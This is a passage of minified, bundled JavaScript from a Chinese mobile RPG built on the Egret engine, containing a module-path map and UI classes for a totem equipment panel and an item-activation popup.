Win.ts":1091,"./game/module/offlinereward/import/EffectivenessTip.ts":1092,"./game/module/offlinereward/import/OfflineRewardWin.ts":1093,"./game/module/oneVSnContest/import/ContestItemChoseWin.ts":486,"./game/module/oneVSnContest/import/ContestMainWin.ts":487,"./game/module/oneVSnContest/import/ContestPlayoffPanel.ts":1095,"./game/module/oneVSnContest/import/ContestRankPanel.ts":1099,"./game/module/oneVSnContest/import/ContestRankRoleItem.ts":1101,"./game/module/oneVSnContest/import/ContestRewardPanel.ts":1102,"./game/module/oneVSnContest/import/ContestSignPanel.ts":1104,"./game/module/paoDian/import/PaoDianCurrentWin.ts":1105,"./game/module/paoDian/import/PaoDianNpcTalkWin.ts":1106,"./game/module/paoDian/import/PaoDianResultWin.ts":1107,"./game/module/paoDian/import/PaoDianWin.ts":1108,"./game/module/pet/view/import/PetGiftWin.ts":1109,"./game/module/pet/view/import/PetSkillShowWin.ts":1110,"./game/module/pet/view/import/PetWin.ts":1111,"./game/module/playway/import/PlayWayDesPanel.ts":1112,"./game/module/playway/import/PlayWayItemRender.ts":488,"./game/module/playway/import/PlayWayPanel.ts":1113,"./game/module/playway/import/PlayWayWin.ts":160,"./game/module/privilege/import/PrivilegeTipWin.ts":1114,"./game/module/qiyu/view/import/QiyuItem.ts":489,"./game/module/qiyu/view/import/QiyuWin.ts":1115,"./game/module/qiyuBoss/import/QiyuBossTouchoffWin.ts":342,"./game/module/qrcodePay/import/QrcodePayWin.ts":1116,"./game/module/ranking/import/RHeirloomMainWin.ts":1117,"./game/module/ranking/import/RRoleWin.ts":490,"./game/module/ranking/import/RSpecialRingWin.ts":1118,"./game/module/ranking/import/RankingWin.ts":1119,"./game/module/recharge/view/import/AutoPrivilegeWin.ts":1121,"./game/module/recharge/view/import/ChargeTipsWin.ts":1122,"./game/module/recharge/view/import/Recharge1Win.ts":1123,"./game/module/recharge/view/import/Recharge2Win.ts":1124,"./game/module/recharge/view/import/RechargeShowWin.ts":197,"./game/module/recharge/view/import/RechargeTQTip.ts":1125,"./game/module/recharge/view/import/RechargeWin.ts":1126,"./game/module/reform/import/EquipClearItem.ts":201,"./game/module/reform/import/EquipClearPanel.ts":262,"./game/module/reform/import/EquipClearWin.ts":1127,"./game/module/reform/import/EquipDuanPoSuitWin.ts":493,"./game/module/reform/import/EquipDuanPoWin.ts":1128,"./game/module/reform/import/EquipQuenchingPanel.ts":1129,"./game/module/reform/import/EquipSoulWin.ts":1130,"./game/module/reform/import/ReformWin.ts":1131,"./game/module/rename/import/RenameWin.ts":1132,"./game/module/rogueAttribute/import/MianCityLock.ts":1133,"./game/module/rogueAttribute/import/RogueAttributeWin.ts":449,"./game/module/rogueAttribute/import/RogueCardSelect.ts":450,"./game/module/rogueAttribute/import/RogueSkillListWin.ts":470,"./game/module/rogueAttribute/import/RogueTalentWin.ts":451,"./game/module/rolewin/view/import/Animals12Win.ts":1134,"./game/module/rolewin/view/import/AnimalsSuitWin.ts":1135,"./game/module/rolewin/view/import/DemonAndWingPanel.ts":1136,"./game/module/rolewin/view/import/JingMaiMain.ts":1137,"./game/module/rolewin/view/import/LianTiBlessWin.ts":1138,"./game/module/rolewin/view/import/LianTiSuitWin.ts":1140,"./game/module/rolewin/view/import/RoleAttrPanel.ts":1142,"./game/module/rolewin/view/import/RoleChooseEquipWin.ts":1145,"./game/module/rolewin/view/import/RoleWin.ts":1147,"./game/module/rolewin/view/import/ShenFuTip.ts":1148,"./game/module/rolewin/view/import/ShenFuWin.ts":1149,"./game/module/rolewin/view/import/WingHintWin.ts":1150,"./game/module/rolewin/view/import/WingSkillTipPanel.ts":1151,"./game/module/rune/import/RuneAttrWin.ts":1152,"./game/module/rune/import/RuneBookItemTipsWin.ts":1153,"./game/module/rune/import/RuneBookWin.ts":1154,"./game/module/rune/import/RuneComposeResultWin.ts":501,"./game/module/rune/import/RuneDecomposePanel.ts":1155,"./game/module/rune/import/RuneReplaceWin.ts":503,"./game/module/rune/import/RuneSynthesisPanel.ts":1157,"./game/module/rune/import/RuneSynthesisSelectPanel.ts":1158,"./game/module/rune/import/RuneeffWin.ts":1159,"./game/module/samsara/import/AddSpiritView.ts":1160,"./game/module/samsara/import/GetSamsaraExpPanel.ts":1161,"./game/module/samsara/import/SamsaraEquipTips.ts":504,"./game/module/samsara/import/SamsaraSoulWin.ts":1162,"./game/module/setting/import/SettingView.ts":1163,"./game/module/shenshou/import/ShenshouDanUseWin.ts":1164,"./game/module/shenshou/import/ShenshouEquipTip.ts":1165,"./game/module/shenshou/import/ShenshouForgeWin.ts":1166,"./game/module/shenshou/import/ShenshouSkillTip.ts":1167,"./game/module/shenshou/import/ShenshouTab.ts":1168,"./game/module/shenshou/import/ShenshouWearEquipWin.ts":1169,"./game/module/shop/import/BuySpecialWin.ts":1170,"./game/module/shop/import/BuyWin.ts":229,"./game/module/shop/import/ShopMianCityTip.ts":1171,"./game/module/shop/import/ShopWin.ts":1172,"./game/module/singlewin/import/SingleWin.ts":1173,"./game/module/sixreincarnations/import/SixBuffWin.ts":468,"./game/module/sixreincarnations/import/SixTeamRoomWin.ts":219,"./game/module/sixreincarnations/import/SixreincarnationsMapWin.ts":456,"./game/module/sixreincarnations/import/SixreincarnationsWin.ts":265,"./game/module/skill/import/MijiLookWin.ts":1174,"./game/module/skill/import/SkillComposePanel.ts":1175,"./game/module/skill/import/SkillSetWin.ts":1176,"./game/module/skill/import/SkillTipsgodwapenView.ts":1177,"./game/module/skill/import/SkillWin.ts":1178,"./game/module/specialring/import/FireRingAbilityView.ts":1179,"./game/module/specialring/import/FireRingExchangeWin.ts":1180,"./game/module/specialring/import/FireRingWin.ts":1181,"./game/module/specialring/import/RingInfoView.ts":1182,"./game/module/specialring/import/RingUpgradeWin.ts":1183,"./game/module/specialring/import/ShenjietipsWin.ts":1184,"./game/module/specialring/import/SpecialRingWin.ts":1185,"./game/module/specialring/view/import/LyMarkMixWin.ts":1186,"./game/module/specialring/view/import/LyMarkSkillTipsWin.ts":1187,"./game/module/specialring/view/import/RingDetailPanel.ts":1188,"./game/module/stardomain/import/StardomainBossWin.ts":336,"./game/module/stardomain/import/StardomainFightView.ts":469,"./game/module/stardomain/import/StardomainMemberInfoWin.ts":507,"./game/module/stardomain/import/StardomainRoomMemberItem.ts":1189,"./game/module/stardomain/import/StardomainRoomView.ts":191,"./game/module/stardomain/import/StardomainWin.ts":192,"./game/module/storehouse/view/import/StoreHouseWin.ts":1190,"./game/module/subpack/XinMoFb/view/import/WarnFrameWin.ts":1191,"./game/module/subpack/XinMoFb/view/import/XinMoFbUI.ts":1192,"./game/module/subpack/XinMoFb/view/import/XinMoFbWin.ts":1193,"./game/module/subpack/XinMoFb/view/import/XinMoLuckWin.ts":1194,"./game/module/subpack/crossguildbattle/view/import/CrossGuildBattleResultWin.ts":1195,"./game/module/subpack/crossguildbattle/view/import/CrossGuildBattleWin.ts":1196,"./game/module/subpack/crossguildbattle/view/import/CrossGuildRankWin.ts":1197,"./game/module/subpack/crossguildbattle/view/import/CrossGuildWarMemWin.ts":1198,"./game/module/subpack/crossguildbattle/view/import/CrossGuildWarUiWin.ts":1199,"./game/module/subpack/crossguildbattle/view/import/CrossGuileWarReliveWin.ts":1200,"./game/module/subpack/crossguildbattle/view/import/SelectMemberPanelWinEx.ts":1201,"./game/module/subpack/crossguildbattle/view/import/SelectMemberRewardWinEx.ts":1202,"./game/module/subpack/devildomInvade/import/DevilInvadeWin.ts":1203,"./game/module/subpack/exclusiveFB/import/ExclusiveFBWin.ts":1204,"./game/module/subpack/guildSoulsLand/import/GuildSoulsLandPanel.ts":1205,"./game/module/subpack/guildSoulsLand/import/GuildSoulsLandResultWin.ts":1213,"./game/module/subpack/kf/devildom/import/DevildomBelongAwardWin.ts":1214,"./game/module/subpack/kf/devildom/import/DevildomBossAwardWin.ts":1215,"./game/module/subpack/kf/devildom/import/DevildomPartAwardWin.ts":1216,"./game/module/subpack/kf/devildom/import/DevildomResultWin.ts":1217,"./game/module/subpack/kf/devildom/import/DevildomWin.ts":1218,"./game/module/subpack/kf/import/KFBossShowWin2.ts":1220,"./game/module/subpack/kf/kfArena/import/KfArenaDuanPanel.ts":1221,"./game/module/subpack/kf/kfArena/import/KfArenaFightWin.ts":1223,"./game/module/subpack/kf/kfArena/import/KfArenaJoinPanel.ts":1224,"./game/module/subpack/kf/kfArena/import/KfArenaMacthPanel.ts":1226,"./game/module/subpack/kf/kfArena/import/KfArenaRankItemRender1.ts":1227,"./game/module/subpack/kf/kfArena/import/KfArenaRankPanel.ts":1228,"./game/module/subpack/kf/kfArena/import/KfArenaRoleItemRender.ts":1230,"./game/module/subpack/kf/kfArena/import/KfArenaWin.ts":1234,"./game/module/subpack/kf/kfBoss/import/KFBossSceneWin.ts":1236,"./game/module/subpack/kf/kfBoss/import/KFBossShowWin.ts":1237,"./game/module/subpack/kf/kfBoss/import/RareListWin.ts":1238,"./game/module/subpack/kf/peaked/view/import/PeakBetWin.ts":1239,"./game/module/subpack/kf/peaked/view/import/PeakMyBattleRecordWin.ts":1240,"./game/module/subpack/kf/peaked/view/import/PeakMyBetRecordWin.ts":1242,"./game/module/subpack/kf/peaked/view/import/PeakTopRankWin.ts":1244,"./game/module/subpack/kf/peaked/view/import/PeakViewBattleReportWin.ts":1246,"./game/module/subpack/kf/peaked/view/import/PeakedFBResult.ts":1248,"./game/module/subpack/kf/peaked/view/import/PeakedMainWin.ts":1249,"./game/module/subpack/kf/publicView/import/CollectWin.ts":187,"./game/module/subpack/kf/publicView/import/ReliveWin.ts":218,"./game/module/subpack/kf/publicView/import/ReliveWin2.ts":221,"./game/module/subpack/kf/publicView/import/ServerSwitchIngWin.ts":1250,"./game/module/subpack/legendTower/import/LegendScoreRankWin.ts":1251,"./game/module/subpack/legendTower/import/LegendScoreWin.ts":1252,"./game/module/subpack/legendTower/import/LegendTipsWin.ts":1253,"./game/module/subpack/legendTower/import/LegendTowerUI.ts":1254,"./game/module/subpack/legendTower/import/LegendTowerWin.ts":1255,"./game/module/subpack/mine/import/HandleTipsWin.ts":1256,"./game/module/subpack/mine/import/MineInfoWin.ts":1257,"./game/module/subpack/mine/import/MineMainWin.ts":1258,"./game/module/subpack/playfun/import/BtnHejiWin.ts":1262,"./game/module/subpack/playfun/import/FuncShowWin.ts":1263,"./game/module/subpack/powerEquip/import/PowerEquipMainWin.ts":1264,"./game/module/subpack/powerEquip/import/PowerEquipSealTipWin.ts":1265,"./game/module/subpack/powerEquip/import/PowerEquipSeletctItem.ts":1266,"./game/module/subpack/powerEquip/import/PowerEquipSkillTipWin.ts":1267,"./game/module/subpack/punchAwake/import/PunchAwakeMainWin.ts":1268,"./game/module/subpack/rareAnimal/view/import/RareAnimalFbUI.ts":1269,"./game/module/subpack/rareAnimal/view/import/RareAnimalResultWin.ts":1270,"./game/module/subpack/rareAnimal/view/import/RareAnimalShowWin.ts":1271,"./game/module/subpack/rareAnimal/view/import/RareAnimalTeamWin.ts":1272,"./game/module/subpack/rexueDide/import/AutoFightInfoWin.ts":1273,"./game/module/subpack/rexueDide/import/AutoFightWin.ts":1274,"./game/module/subpack/shield/import/ShieldEquipForgeWin.ts":1275,"./game/module/subpack/shield/import/ShieldEquipTipsWin.ts":1276,"./game/module/subpack/shield/import/ShieldSkillWin.ts":1277,"./game/module/subpack/showImg/import/ShowImgView.ts":1278,"./game/module/subpack/smmz/import/SmEquipForgeWin.ts":1279,"./game/module/subpack/smmz/import/SmItemTipsWin.ts":1280,"./game/module/subpack/smmz/import/SmMarketWin.ts":1281,"./game/module/subpack/smmz/import/SmSoulTipsWin.ts":1282,"./game/module/subpack/spiritBoss/view/import/SpiritBossUI.ts":1283,"./game/module/subpack/spiritEquip/import/SpiritAdvanceWin.ts":1284,"./game/module/subpack/spiritEquip/import/SpiritSkillTipWin.ts":1285,"./game/module/subpack/spiritEquip/import/SpiritTipWin.ts":1286,"./game/module/subpack/vip/import/OpenSerVipWin.ts":1287,"./game/module/subpack/vip/import/SuperVipWin.ts":1288,"./game/module/subpack/vip/import/Vip3MWin.ts":1289,"./game/module/subpack/vip/import/Vip3Win.ts":1290,"./game/module/subpack/vip/import/VipGiftWin.ts":1291,"./game/module/subpack/vip/import/VipWin.ts":1292,"./game/module/subpack/vip/import/ViptipsWin.ts":1293,"./game/module/subpack/vipboss/import/VipBossWin.ts":1294,"./game/module/subpack/warOrder/import/WarOrderActionWin.ts":1295,"./game/module/subpack/warOrder/import/WarOrderBuyLvWin.ts":1296,"./game/module/subpack/warOrder/import/WarOrderWin.ts":1297,"./game/module/subpack/xinMoEquip/import/XinMoEvoSkinWin.ts":1298,"./game/module/subpack/xinMoEquip/import/XinMoImprintWin.ts":1299,"./game/module/svip/import/SVipPanel.ts":1300,"./game/module/targetList/import/TargetListPanel.ts":1301,"./game/module/targetList/import/TargetPlayerBigBloodPanel.ts":1302,"./game/module/targetPanel/import/TargetBloodPanel.ts":1303,"./game/module/task/import/DayAndWeekTaskWin.ts":1304,"./game/module/task/import/DayAndWeekTipWin.ts":1305,"./game/module/task/import/ExperienceWin.ts":1306,"./game/module/task/import/TaskTips.ts":1307,"./game/module/task/import/TaskTipsRenderer.ts":516,"./game/module/task/import/TasktipsTip.ts":1308,"./game/module/task/view/import/LimitStartTipsView.ts":1309,"./game/module/task/view/import/LimitTaskView.ts":1310,"./game/module/task/view/import/TaskAlertWin.ts":1311,"./game/module/tips/import/AutoEquipView.ts":1313,"./game/module/tips/import/BoostPowerView.ts":1315,"./game/module/tips/import/ShenFuEquipTipsWin.ts":1316,"./game/module/tips/import/TipsView.ts":1317,"./game/module/title/import/TitlePanel.ts":314,"./game/module/title/import/TitleTipsWin.ts":1322,"./game/module/topwintitle/import/RoleSelectPanel.ts":1323,"./game/module/treasurehunt/import/HuntBoxsTips.ts":518,"./game/module/treasurehunt/import/HuntResultWin.ts":519,"./game/module/treasurehunt/import/HuntWarnBuyWin.ts":111,"./game/module/treasurehunt/import/LegendEquipSkillWin.ts":1325,"./game/module/treasurehunt/import/LegendTipsWin.ts":1326,"./game/module/treasurehunt/import/OrangeEquipForgePanel.ts":1327,"./game/module/treasurehunt/import/OrangeEquipSuitWin.ts":1328,"./game/module/treasurehunt/import/RuneExchangeShopWin.ts":1329,"./game/module/treasurehunt/import/TreasureChuanshiGiftWin.ts":1330,"./game/module/treasurehunt/import/TreasureHuntWin.ts":1332,"./game/module/treasurehunt/import/TreasureStorePanel.ts":1333,"./game/module/tuntian/import/TunTianEquipWin.ts":1334,"./game/module/tuntian/import/TunTianLvPanel.ts":1335,"./game/module/tuntian/import/TunTianSetIcon.ts":1339,"./game/module/tuntian/import/TunTianSuitPanel.ts":521,"./game/module/tuntian/import/TunTianTunsiPanel.ts":1340,"./game/module/warn/import/BagAddCellWin.ts":1342,"./game/module/warn/import/BagAddItemWarn.ts":1343,"./game/module/warn/import/BagFullTipsWin.ts":175,"./game/module/warn/import/ShopGoodsWarn.ts":1344,"./game/module/warn/import/WarnWin.ts":27,"./game/module/warn/import/WelcomeWin.ts":349,"./game/module/warn/import/WelcomeWin2.ts":1345,"./game/module/warsoul/import/WarSoulBookPanel.ts":1346,"./game/module/warsoul/import/WarSoulDecomPanel.ts":1347,"./game/module/warsoul/import/WarSoulIdenPanel.ts":1348,"./game/module/warsoul/import/WarSoulInfoPanel.ts":1349,"./game/module/warsoul/import/WarSoulLvUpPanel.ts":1351,"./game/module/warsoul/import/WarSoulMainPanel.ts":1352,"./game/module/warsoul/import/WarSoulMemPanel.ts":1353,"./game/module/warsoul/import/WarSoulSkillPanel.ts":1356,"./game/module/warsoul/import/WarSoulSwallowPanel.ts":1357,"./game/module/weapons/import/WeaponPanel.ts":1358,"./game/module/weapons/import/WeaponSoulBreakWin.ts":1359,"./game/module/weapons/import/WeaponSoulSkillTips.ts":1360,"./game/module/weapons/import/WeaponSoulUplvWin.ts":1361,"./game/module/wing/import/WingFeishengTipsWin.ts":1362,"./game/module/wing/import/WingZizhiTipsWin.ts":1363,"./game/module/wxgame/import/GameClubOCWin.ts":1364,"./game/module/wxgame/import/GameClubRule.ts":1365,"./game/module/wxgame/import/GameClubWin.ts":527,"./game/module/wxgame/import/GameclubCT.ts":119,"./game/module/wxgame/import/GameclubComShareWin.ts":1366,"./game/module/wxgame/import/GameclubComTVWin.ts":1367,"./game/module/wxgame/import/GameclubFirstWin.ts":1368,"./game/module/wxgame/import/GameclubOCSignInItem.ts":528,"./game/module/wxgame/import/GameclubOCSignInWin.ts":1369,"./game/module/wxgame/import/GameclubOCTaskItem.ts":529,"./game/module/wxgame/import/GameclubOCTaskWin.ts":1370,"./game/module/wxgame/import/WxGameCustomRule.ts":1371,"./game/module/wxgame/import/WxGameShareWin.ts":530,"./game/module/zhanChang/import/BurningDesertFightView.ts":466,"./game/module/zhanChang/import/BurningDesertMainView.ts":1373,"./game/module/zhanChang/import/BurningDesertMemberInfoWin.ts":531,"./game/module/zhanChang/import/BurningDesertRoomMemberItem.ts":1377,"./game/module/zhanChang/import/ShiKongZhiJingFbReliveWin.ts":467,"./game/module/zhanChang/import/ShiKongZhiJingFbView.ts":268,"./game/module/zhanling/import/ZhanLingItemTips.ts":1378,"./game/module/zhanling/import/ZhanLingShenzhuWin.ts":1379,"./game/module/zhanling/import/ZhanLingSuitTip.ts":1380,"./game/module/zhanling/import/ZhanLingTips.ts":1381,"./game/module/zhanling/import/ZhanlingZBTipWin.ts":1382,"./game/module/zs/import/LhExpTip.ts":532,"./game/module/zs/import/LhLevelTip.ts":533,"./game/module/zs/import/LhPanel.ts":1383,"./game/module/zs/import/MijiLockWin.ts":1384,"./game/module/zs/import/MijiTipWin.ts":1385,"./game/module/zs/import/MijiZhWin.ts":1386,"./game/module/zs/import/OnlineTimeAwardWin.ts":534,"./game/module/zs/import/ZsAndLhWin.ts":1387,"./game/module/zs/import/ZsPanel.ts":1388,"./game/module/zs/import/ZzXiuWeiTip.ts":536};
n.keys=function(){return Object.keys(s)},n.resolve=o,t.exports=n,n.id=765},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TotemAttrItemRender=e.TotemItemRender=e.TotemPanel=void 0;var n=i(49),o=i(3),s=i(1),a=i(22),r=i(0),l=i(39),h=i(15),u=i(4),p=i(6),d=i(40),c=i(10),f=i(12),g=i(2),m=i(80),v=i(354),y=i(230),C=i(242),T=i(355),b=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="Totem2Skin",e.totemGridArr=[],e.selectIdx=0,e.selectId=1,e.currentStates=["notActive","Active"],e.isWearDone=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.totemList.itemRenderer=w,this.totemList.dataProvider=this.ac=new eui.ArrayCollection,this.attrList.itemRenderer=I,this.totemList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this);for(var t=0;this["item"+t];)this["item"+t].data=t,this.addTouchEvent(this["item"+t],this.onSelectClick),t++;this.addTouchEvent(this.txt_decomp,this.onClick),this.addTouchEvent(this.btn_suit,this.onClick),this.addTouchEvent(this.btn_help,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updataInfo,m.TotemCT.ins().updateTotemItem),observe(this,this.updataInfo,p.BagCT.ins().postItemAdd),observe(this,this.initTotemList,m.TotemCT.ins().updateTotemItem),observe(this,this.initTotemList,p.BagCT.ins().postItemAdd),observe(this,this.initTotemList,p.BagCT.ins().postItemChange),this.initTotemList(),this.selectIdx=0;var i=r.GlobalConfig.TotemUnitConfig;for(var n in i)u.ActorCC.jobId==i[n].job&&(this.selectId=i[n].id);this.updataInfo()},e.prototype.updataInfo=function(){this.changeState(),this.initTotemInfo(),this.initTotemImg(),this.initTotemSupImg(),this.setAni(),this.updateRedPoint()},e.prototype.changeState=function(){var t=r.GlobalConfig.TotemUnitConfig[this.selectId].iconRes,e=m.TotemCT.ins().checkIsWear(Number(t));this.currentState=e?this.currentStates[1]:this.currentStates[0],this.isWearDone=m.TotemCT.ins().checkIsWearDone(Number(t),this.selectId),this.validateNow()},e.prototype.initTotemList=function(){var t=r.GlobalConfig.TotemUnitConfig,e=[];for(var i in t)if(u.ActorCC.jobId==t[i].job){var n={name:t[i].name,icon:t[i].iconRes,quality:t[i].quality};e.push(n)}var o=0;for(var s in t)if(o++,!(4>o||t[s].job)){var n={name:t[s].name,icon:t[s].iconRes,quality:t[s].quality};e.push(n)}this.ac.replaceAll(e)},e.prototype.initTotemInfo=function(){var t=r.GlobalConfig.TotemUnitConfig[this.selectId];this.txt_totemName.text=t.name;var e=r.GlobalConfig.TotemUnitConfig[this.selectId].iconRes;this.txt_power.text=gettext("战力：{0}",m.TotemCT.ins().returnPower(Number(e)));var i=m.TotemCT.ins().returnAttr(Number(e));m.TotemCT.ins().setAttrValue(i),this.attrList.dataProvider=new eui.ArrayCollection(i),this.txt_none.text=gettext("图腾-{0} 当前未有激活部件",t.name)},e.prototype.returnQArr=function(t){for(var e=[],i=0;i<t.length;i++)e.push(1);return e},e.prototype.initTotemImg=function(){this.clearAllTotemImg();var t=r.GlobalConfig.TotemConfig,e=r.GlobalConfig.TotemUnitConfig[this.selectId].iconRes,i=r.GlobalConfig.TotemUnitConfig[this.selectId].partNum;this.totemGridArr=[];for(var o=1;i+1>o;o++){var s=t[e+o],a=null===s||void 0===s?void 0:s.touchGrid;if(a.length>0)for(var l=0;l<a.length;l++)this.totemGridArr[a[l]-1]=e+o;var h=new eui.Image(""+(e+o)),u=this.returnSetImgIndexByPoint(s.putPoint),p=m.TotemCT.ins().judgeTotemQuality(Number(e+o));0==p&&(h.filters=n.FilterUtil.ARRAY_GRAY_FILTER),this["img"+u].addChild(h),h.x=h.y=0}},e.prototype.clearAllTotemImg=function(){for(var t=0;this["img"+t];){var e=this["img"+t];if(e&&e.numElements>0){var i=e.getElementAt(0);i&&(i.source=""),e.removeChildren()}t++}},e.prototype.returnSetImgIndexByPoint=function(t){return t[0]+6*t[1]},e.prototype.initTotemSupImg=function(){this.clearAllTotemSupImg();for(var t=r.GlobalConfig.TotemConfig,e=r.GlobalConfig.TotemUnitConfig[this.selectId].iconRes,i=r.GlobalConfig.TotemUnitConfig[this.selectId].partNum,o=1;i+1>o;o++){var s=t[e+o],a=new eui.Image(s.qualityTile),l=this.returnSetImgIndexByPoint(s.putPoint),h=m.TotemCT.ins().judgeTotemQuality(Number(e+o)),u=n.FilterUtil.returnColorFilter(h);a.filters=[u],this["supImg"+l].addChild(a),a.x=a.y=0,a.scaleX=a.scaleY=2}},e.prototype.clearAllTotemSupImg=function(){for(var t=0;this["supImg"+t];){var e=this["supImg"+t];if(e&&e.numElements>0){var i=e.getElementAt(0);i&&(i.source=""),e.removeChildren()}t++}},e.prototype.onItemClick=function(t){if(this.selectIdx!=t.currentTarget.selectedIndex){if(this.selectIdx=t.currentTarget.selectedIndex,0==this.selectIdx){var e=r.GlobalConfig.TotemUnitConfig;for(var i in e)u.ActorCC.jobId==e[i].job&&(this.selectId=e[i].id)}else this.selectId=this.selectIdx+3;this.isWearDone=!1,this.updataInfo()}},e.prototype.onSelectClick=function(t){var e;if(this.isWearDone)return this.isWearDone=!1,void this.setAni();var i;t&&(i=null===(e=null===t||void 0===t?void 0:t.target)||void 0===e?void 0:e.data);var n=this.totemGridArr[i],o=r.GlobalConfig.TotemConfig[n],s=m.TotemCT.ins().returnItemIdByItemId(n),a=new d.ItemData;a.configID=s;var h=m.TotemCT.ins().checkCanWear(n);h?win.open("RoleChooseEquipWin",0,o.pos,l.ItemType.TYPE_56,o.group):win.open(y.TotemDetailedItem,a,1)},e.prototype.onClick=function(t){var e;switch(t.target){case this.txt_decomp:win.open(v.TotemDescomWin);break;case this.btn_suit:0==this.selectIdx?win.open(C.TotemSkillTipsWin,this.selectId):win.open(T.TotemSuitTipsWin,this.selectId);break;case this.btn_help:win.open("CommonHelpWin",(null===(e=r.GlobalConfig.HelpInfoConfig[322])||void 0===e?void 0:e.text)||"")}},e.prototype.setAni=function(){this.clearAni(),this.isWearDone?(this.itemIcon.visible=!0,this.colorGrop.visible=!1,this.redGrop.visible=!1,this.itemIcon.source="img_"+r.GlobalConfig.TotemUnitConfig[this.selectId].iconRes+"_jpg",this.itemIcon.scaleX=this.itemIcon.scaleY=1,this.ani()):(this.itemIcon.visible=!1,this.colorGrop.visible=!0,this.redGrop.visible=!0)},e.prototype.ani=function(){var t=this;this.itemIcon.scaleX=this.itemIcon.scaleY=1,this.itemIcon.alpha=.5,egret.Tween.get(this.itemIcon).to({verticalCenter:5},20).to({verticalCenter:0},20).to({verticalCenter:-5},20).to({verticalCenter:0},20).to({verticalCenter:5},20).to({verticalCenter:0},20).call(function(){egret.Tween.get(t.itemIcon).to({alpha:0},1e3),egret.Tween.get(t.itemIcon).to({scaleX:1.2,scaleY:1.2},1e3).call(function(){t.isWearDone&&egret.Tween.get(t.itemIcon).to({alpha:0},1500).call(function(){t.ani()})})})},e.prototype.clearAni=function(){egret.Tween.removeTweens(this.itemIcon)},e.prototype.updateRedPoint=function(){this.clearAllRedP();for(var t=r.GlobalConfig.TotemUnitConfig[this.selectId].iconRes+1,e=m.TotemCT.ins().returnRedByTotemTypeArr(t),i=[],n=r.GlobalConfig.TotemConfig,o=0;o<e.length;o++){var s=n[e[o]].touchGrid,a=this.returnPoint(s);i.push(a)}for(var l=0;l<i.length;l++)this["redImg"+i[l]].visible=!0},e.prototype.clearAllRedP=function(){for(var t=0;this["redImg"+t];)this["redImg"+t].visible=!1,t++},e.prototype.returnPoint=function(t){for(var e=[],i=0;i<t.length;i++){var n=(t[i]-1)%6,o=Math.floor((t[i]-1)/6),s={x:n,y:o};e.push(s)}e.sort(this.sort);for(var a=e[0].x,r=0,l=0;l<e.length;l++)e[l].x==a&&(r=e[l].y);return a+6*r},e.prototype.sort=function(t,e){return t.y<e.y?1:t.x>=e.x?-1:0},e.prototype.tabRp=function(){var t;return null===(t=m.TotemCT.ins().totemAllRed)||void 0===t?void 0:t.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=f.OpenSystem.ins().checkSysOpen(h.SystemType.Totem);return i||g.TipsCT.ins().showTips(f.OpenSystem.ins().getNoOpenTips(h.SystemType.Totem)),i},e}(s.BaseView);e.TotemPanel=b,window.TotemPanel=b,__reflect(b.prototype,"TotemPanel",[]),window.TotemPanel=b;var w=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.icon_head.source="icon_"+this.data.icon,this.txt_totemName.text=this.data.name,this.txt_totemName.textColor=c.ItemUtil.getQualityColor(this.data.quality),this.isRed()},e.prototype.isRed=function(){var t=this.data.icon;this.red.visible=m.TotemCT.ins().isRedByTotemType(t+1)},e}(o.BaseItemRender);e.TotemItemRender=w,window.TotemItemRender=w,__reflect(w.prototype,"TotemItemRender",[]);var I=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.type.text=a.AttributeData.getAttrStrByTypeTotem(this.data.type)+"：",this.value.text=this.data.value},e}(o.BaseItemRender);e.TotemAttrItemRender=I,window.TotemAttrItemRender=I,__reflect(I.prototype,"TotemAttrItemRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Activationtongyong=void 0;var n=i(21),o=i(16),s=i(157),a=i(1),r=i(0),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.canClose=!0,e._sn_="activationtongyong",e.defaultRect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){switch(t.target){case this.eRect:this.canClose&&win.close(this)}},e.prototype.addDisplay=function(){for(var t=this,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var o=e[0],a=e[1],l=e[2];this.closeFunc=e[3];var h=e[4],u=e[5]||0,p=e[6],d=e[7];this.titleStr=o?"up":"a";var c=s.RegExpUtil.NonNumericExp.exec(a);if(c){for(var f="",g="",m=0;m<a.length;m++)m>=c.index?g+=a[m]:f+=a[m];var v="";v=Number(f)/10>=1?f+"\n":" "+f+"\n",this.itemname.text=v+g.split("").join("\n")}else this.itemname.text=a.split("").join("\n");this.img.source=l,0!=u?(this.actEffMC||(this.actEffMC=new n.MovieClip),this.actEffMC.parent||this.eActEff.addChild(this.actEffMC),this.actEffMC.playFile(RES_DIR_EFF+h,-1)):h?(this.imgEff||(this.imgEff=new n.MovieClip),this.imgEff.parent||this.imgMc.addChild(this.imgEff),this.imgEff.playFile(RES_DIR_EFF+h,-1)):p&&(this.wingMc||(this.wingMc=new n.MovieClip),this.wingMc.parent||this.eWing.addChild(this.wingMc),this.wingMc.playFile(RES_DIR_WING_IN+p,-1));var y=0;if(d){this.proMc||(this.proMc=new n.MovieClip),this.proMc.parent||this.ePro.addChild(this.proMc),this.proMc.playFile(RES_DIR_EFF+d,1),y=2e3;var C=RES_DIR_MONSTER+(r.GlobalConfig.PetConfig.actModel+"_2s");this.petMc||(this.petMc=new n.MovieClip),this.petMc.parent||this.ePet.addChild(this.petMc),this.petMc.playFile(C,-1)}this.canClose=!d,this.bgMc||(this.bgMc=new n.MovieClip),this.bgMc.parent||this.bg.addChild(this.bgMc),this.titleMc||(this.titleMc=new n.MovieClip),this.titleMc.parent||this.title.addChild(this.titleMc);var 